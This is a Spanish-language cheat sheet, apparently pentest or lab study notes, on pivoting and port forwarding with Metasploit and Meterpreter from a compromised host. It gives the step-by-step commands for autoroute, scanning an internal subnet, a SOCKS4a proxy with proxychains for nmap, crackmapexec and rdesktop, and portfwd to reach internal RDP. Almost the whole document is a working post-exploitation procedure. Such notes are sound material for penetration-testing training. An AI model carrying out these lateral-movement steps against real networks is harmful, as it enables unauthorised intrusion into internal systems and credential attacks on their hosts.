# Pivoting y Portforgarding: Metasploit/meterpreter

## 🧭 [1] Enumerar interfaces en la máquina comprometida

```bash
meterpreter > ipconfig
```
> Muestra todas las interfaces de red disponibles en la máquina víctima. Útil para identificar redes internas alcanzables para pivoting.

---

## 🔁 [2] Pivoting automático con `autoroute`

### Paso 1: Cargar el módulo autoroute

```bash
msf6 > use post/multi/manage/autoroute
```

### Paso 2: Configurar sesión y red

```bash
set SESSION 1
set CMD add
set SUBNET 172.16.113.0
set NETMASK 255.255.255.0
run
```
> Agrega automáticamente una ruta interna a través de la sesión Meterpreter para que puedas lanzar otros ataques a esa red.

### Paso 3: Ver rutas activas

```bash
set CMD print
run
```

O directamente:

```bash
route print
```
> Muestra las rutas disponibles para pivoting desde Metasploit.

---

## 🧰 [3] Usar módulos de escaneo sobre la red pivoteada

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.113.0/24
set PORTS 80,135,139,443,445,3389
run
```
> Escaneo TCP a través de la sesión con autoroute configurado.

---

## 🌐 [4] Pivoting manual con SOCKS4a + proxychains

### Paso 1: Levantar proxy SOCKS

```bash
use auxiliary/server/socks4a
run
```
> Abre un proxy SOCKS en `127.0.0.1:1080` para enrutar tráfico externo.

### Paso 2: Verificar que Metasploit reconoce la sesión para proxy

```bash
route print
```
- Usar multi/handler y configurar la ruta de ser necesario:

```
route add 172.16.113.0/24 12
```

> Asegurate de que tu sesión aparece como gateway para la red deseada.

### Paso 3: Configurar proxychains

Editar `/etc/proxychains.conf` y al final dejar:

```
socks4 127.0.0.1 1080
```

### Paso 4: Usar herramientas externas

```bash
proxychains nmap -Pn -sT -p 445 172.16.113.10
proxychains crackmapexec smb 172.16.113.10 -u user -p pass
proxychains rdesktop 172.16.113.10
```

---

## 🚪 [5] Port forwarding (redireccionamiento de puertos)

### Local port forward (atacar desde Kali a servicio remoto)

```bash
meterpreter > portfwd add -l 4444 -p 3389 -r 172.16.113.10
```
- `-l`: Puerto local en Kali.
- `-p`: Puerto remoto en la red interna.
- `-r`: IP remota dentro de la red pivoteada.

> Esto te permite hacer `rdesktop 127.0.0.1:4444` como si estuvieras conectado directamente.

### Ver forwards activos

```bash
meterpreter > portfwd list
```

### Eliminar un forward

```bash
meterpreter > portfwd delete -l 4444
```

---

## 🔒 [6] Borrar rutas agregadas por autoroute (si hace falta)

```bash
set CMD delete
set SUBNET 172.16.113.0
set NETMASK 255.255.255.0
run
```


